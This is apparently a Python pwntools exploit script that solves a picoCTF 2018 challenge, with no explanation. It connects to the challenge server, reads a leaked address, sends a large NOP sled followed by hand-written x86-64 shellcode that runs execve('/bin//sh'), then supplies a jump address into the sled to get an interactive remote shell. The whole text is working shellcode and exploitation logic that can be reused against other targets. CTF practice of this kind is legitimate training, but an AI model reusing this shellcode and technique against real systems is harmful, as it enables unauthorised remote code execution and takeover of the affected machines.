from pwn import *

r = remote('2018shell3.picoctf.com', 24627)

current_addr = r.recvuntil('> ').split('\n')[-3].split(':')[1][1:]

sc = '\x48\x31\xF6\x48\x31\xD2\x56\x48\xB8\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x50\x48\x89\xE7\x48\x31\xC0\x48\x83\xF0\x3B\x0F\x05'
payload = '\x90'* 0x950 + sc

r.sendline(payload)
r.recvuntil('> ')
r.sendline(hex(int(current_addr, 16) + 0x800))

r.interactive()
